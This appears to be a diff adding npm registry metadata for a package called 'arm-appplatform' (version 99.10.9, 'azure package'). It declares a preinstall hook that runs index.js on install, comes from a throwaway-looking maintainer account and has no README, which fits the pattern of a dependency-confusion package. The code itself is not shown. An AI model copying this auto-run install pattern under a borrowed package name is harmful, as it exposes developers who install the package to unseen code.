@@ -1,0 +1,62 @@
+{
+    "_id": "arm-appplatform",
+    "name": "arm-appplatform",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "arm-appplatform",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "arm-appplatform@99.10.9",
+            "_nodeVersion": "14.16.1",
+            "_npmVersion": "6.14.11",
+            "dist": {
+                "integrity": "sha512-tMCDwTUjWsqg7nDsIbCvR7gP2F2+jqt9zYQ7y9tKnm/BY+52RwkUpj5pHIqybC82LNt/fBQ5V8wBwjf1BCCk/g==",
+                "shasum": "53ee9421bdb394f6e469ab8c5a6322fe2f8046fb",
+                "tarball": "https://registry.npmjs.org/arm-appplatform/-/arm-appplatform-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5067,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiNmrRACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmrjDBAAmV6y3xEiL6BOIrHH3cnslk0Emkd2GQVOBuQ7hnDsOKT+IJKH\r\n/ObbmuO14+auR5dbH9of8BifP79tUZ6eoSpsgxrBUgWDadFA799KR1k8hyrU\r\n0JvJ8mHSodwzYAGmC68CLL891KojZIiDTiT6fx8Q90gMKeFCqDjDNV98bLKt\r\n1nMtwvlpuSLszZW6pzlg5TIv+nyeL87sYW29tWmb0UFdQHGT2yUtmB8GCe5J\r\nq3Hz6+U5HjxRkiFCIMpULAacP12B5HBmZ9dYmlR8b4AVCPxicEe9akqddBwQ\r\n4RErefvCWYNLo2CBBd0aNYMpjbK3zKl9yOko/hvtgrOvDk1o5m2cf1NCIa7M\r\nU88htvxzkYPDG2CPU3F3rUO8wILISsJdCeY7it06TRqmXNDihwyaj7jpWMYP\r\n63s/0/e51oDW3n6qXn/WdvlV0HDTQ1z1D5idl/X/ravXItBhwsYFhS75Ya3e\r\nZ+ORMv9eNKmFAoc6z0G1KxIV1ZUhEDghn7ItRoC93jstqp109m/EL+U5yYw8\r\nxKVyeoIoej0Z3QNIRmcdVxsEUPzp9Ul5EjEo5OX+CxUo0KKaCw9eC/Ao5b6W\r\nQxPF7AxRrFsrq046aq0754vRVF/CZIla9v8j8u9pJ1guE5Tu7RLxJDjmE0Sy\r\n83TOqtbxZFXc7ViyruHNGnR/5ZZ9ZUGPm14=\r\n=cSOf\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "lo83i664",
+                "email": "lo83i664@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "lo83i664",
+                    "email": "lo83i664@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/arm-appplatform_99.10.9_1647733456952_0.6495074105562268"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-19T23:44:16.951Z",
+        "99.10.9": "2022-03-19T23:44:17.097Z",
+        "modified": "2022-03-19T23:44:17.180Z"
+    },
+    "maintainers": [
+        {
+            "name": "lo83i664",
+            "email": "lo83i664@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
